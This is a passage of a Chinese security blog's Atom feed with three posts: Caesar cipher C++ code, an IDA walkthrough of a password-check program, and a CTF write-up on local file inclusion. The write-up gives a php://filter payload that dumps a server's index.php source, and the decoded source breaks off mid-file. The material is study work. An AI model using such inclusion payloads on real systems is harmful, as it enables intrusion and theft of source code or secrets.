    <content type="html"><![CDATA[<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>  在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>  (已知密钥情况下)<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span>;<span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span>;<span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> C;</span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="keyword">int</span> model;</span><br><span class="line"><span class="comment">//int len;//字符串长度 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Model:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"1:Encry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"2:Decry"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;model;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be encrypted:"</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="comment">//len=strlen(C);//错误:C需要转换为char*类型 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Encryption(C,key,model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(model==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Decryption(C,key,model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;C.length();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(C[i]&gt;=<span class="string">'A'</span>&amp;&amp;C[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">C[i]=<span class="string">'A'</span>+(C[i]-<span class="string">'A'</span>+key)%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(C[i]&gt;=<span class="string">'a'</span>&amp;&amp;C[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">C[i]=<span class="string">'a'</span>+(C[i]-<span class="string">'a'</span>+key)%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the encryption is："</span>&lt;&lt;C&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Error！"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">2</span>)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;M.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[i] &gt;= <span class="string">'A'</span> &amp;&amp; M[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">                M[i] = <span class="string">'A'</span>+(M[i]-<span class="string">'A'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//M[i]='A'+(M[i]-'A'+(26-key))</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(M[i] &gt;= <span class="string">'a'</span> &amp;&amp; M[i] &lt;= <span class="string">'z'</span>)</span><br><span class="line">                M[i] = <span class="string">'a'</span>+(M[i]-<span class="string">'a'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the decryption is:"</span>&lt;&lt;M&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error！"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><hr><p>完整版（就是穷举了key）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span>;<span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span>;<span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> C;</span><br><span class="line"><span class="keyword">int</span> key;<span class="comment">//偏移位 </span></span><br><span class="line"><span class="keyword">int</span> mode;</span><br><span class="line"><span class="comment">//int len;//字符串长度 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Mode:(Please enter selection mode！！！)"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"1:Encry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"2:Decry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"3:Keyless Decryption"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;mode;</span><br><span class="line"><span class="keyword">if</span>(mode==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be encrypted:"</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="comment">//len=strlen(C);//错误:C需要转换为char*类型 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Encryption(C,key,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mode==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Decryption(C,key,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mode==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">26</span>;k++)</span><br><span class="line">Decryption(C,k,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//if(mode==1)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;C.length();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(C[i]&gt;=<span class="string">'A'</span>&amp;&amp;C[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">C[i]=<span class="string">'A'</span>+(C[i]-<span class="string">'A'</span>+key)%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(C[i]&gt;=<span class="string">'a'</span>&amp;&amp;C[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">C[i]=<span class="string">'a'</span>+(C[i]-<span class="string">'a'</span>+key)%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the encryption is："</span>&lt;&lt;C&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;"Error！"&lt;&lt;endl; </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//if(mode==2)</span></span><br><span class="line"> <span class="comment">//&#123;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;M.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[i] &gt;= <span class="string">'A'</span> &amp;&amp; M[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">                M[i] = <span class="string">'A'</span>+(M[i]-<span class="string">'A'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//M[i]='A'+(M[i]-'A'+(26-key))</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(M[i] &gt;= <span class="string">'a'</span> &amp;&amp; M[i] &lt;= <span class="string">'z'</span>)</span><br><span class="line">                M[i] = <span class="string">'a'</span>+(M[i]-<span class="string">'a'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the decryption is:"</span>&lt;&lt;M&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">  <span class="comment">//&#125;</span></span><br><span class="line">  <span class="comment">//  else</span></span><br><span class="line">  <span class="comment">//  cout&lt;&lt;"Error！"&lt;&lt;endl; </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;凯撒密码&quot;&gt;&lt;a href=&quot;#凯撒密码&quot; class=&quot;headerlink&quot; title=&quot;凯撒密码&quot;&gt;&lt;/a&gt;凯撒密码&lt;/h1&gt;&lt;p&gt;  在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加
      
    
    </summary>
    
      <category term="密码学" scheme="https://singlemindedt.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://singlemindedt.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>初探栈溢出</title>
    <link href="https://singlemindedt.github.io/2019/10/10/%E5%88%9D%E6%8E%A2%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://singlemindedt.github.io/2019/10/10/初探栈溢出/</id>
    <published>2019-10-10T14:09:17.000Z</published>
    <updated>2019-10-10T15:56:49.921Z</updated>
    
    <content type="html"><![CDATA[<p>这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!”</p><p>将程序拖入IDA，在左边窗口有<strong>函数名称</strong>列表，找到_main函数双击，可以看到其程序流程图：<br><img src="/images/zyc0.png" alt="zyc0"><br>伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+0h] [ebp-8h]//变量v4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4010A7(aPleaseInputPas, v4);<span class="comment">//函数sub_4010A7需要调用两个参数aPleaseInputPas, v4</span></span><br><span class="line">    <span class="built_in">scanf</span>(aS, &amp;v4);<span class="comment">//输入v4</span></span><br><span class="line">    <span class="keyword">if</span> ( !sub_401000(&amp;v4) )<span class="comment">//若sub_401000(&amp;v4)==0调用 sub_4010A7(aIncorrectPassw, v4)</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_4010A7(aIncorrectPassw, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_4010A7(aCongratulation, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们接下来查看 判断函数sub_401000：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(a1, a1234567);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*比较两个字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">设这两个字符串为str1，str2，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1=str2，则返回零；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1&lt;str2，则返回负数；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">若str1&gt;str2，则返回正数。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>查看sub_4010A7：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4010A7</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = _stbuf(&amp;stru_4080E0);</span><br><span class="line">  v3 = sub_401E34(&amp;stru_4080E0, a1, (<span class="keyword">int</span>)&amp;a2);</span><br><span class="line">  _ftbuf(v2, &amp;stru_4080E0);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里给出一个简单的exe文件，实现的功能为：让用户键入密码，程序将之与固定密码(1234567)进行比较，如果错误继续键入，成功则提示“Congratulation! You have passed the verification!”&lt;/p&gt;
&lt;p&gt;将程序拖入IDA，在左
      
    
    </summary>
    
      <category term="notes" scheme="https://singlemindedt.github.io/categories/notes/"/>
    
    
      <category term="re" scheme="https://singlemindedt.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>ics-05</title>
    <link href="https://singlemindedt.github.io/2019/10/05/ics-05/"/>
    <id>https://singlemindedt.github.io/2019/10/05/ics-05/</id>
    <published>2019-10-05T02:53:52.000Z</published>
    <updated>2019-12-09T01:07:31.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><h2 id="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"><a href="#题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统" class="headerlink" title="题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统"></a>题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</h2><p>点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面：<br>  <img src="/images/ics05-1.png" alt="ics05-1.png"><br>除了index.php页面，没有其他有效信息，查看源码：<br>  <img src="/images/ics05-2.png" alt="ics05-2.png"><br>可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞；<br>  <img src="/images/ics05-3.png" alt="ics05-3.png"><br>**<br>本地文件包含漏洞（LFI漏洞）的黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞:<br>主要涉及到的函数：include(),require()、include_once(),require_once()<br>magic_quotes_gpc()、allow_url_fopen()、allow_url_include()、move_uploaded_file() 、readfile() file()、and file_get_contents()、upload_tmp_dir()、post_max_size()、and max_input_time()等<br>典型漏洞代码：&lt;!–?php include($_GET[‘pages’].‘.php’); ?–&gt;<br>参考文章：<a href="https://blog.csdn.net/qq_29419013/article/details/81202358" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81202358</a><br>**<br>尝试读取index.php的页面源码，通过php内置协议直接读取代码：<br>?page=php://filter/read=convert.base64-encode/resource=index.php<br>  <img src="/images/ics05-4.png" alt="ics05-4.png"><br>得到很长一串base64编码，解码得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"renderer"</span> content=<span class="string">"webkit"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge,chrome=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"layui/css/layui.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class="layui-nav"&gt;</span><br><span class="line">        &lt;li class="layui-nav-item layui-this"&gt;&lt;a href="?page=index"&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class="layui-elem-field 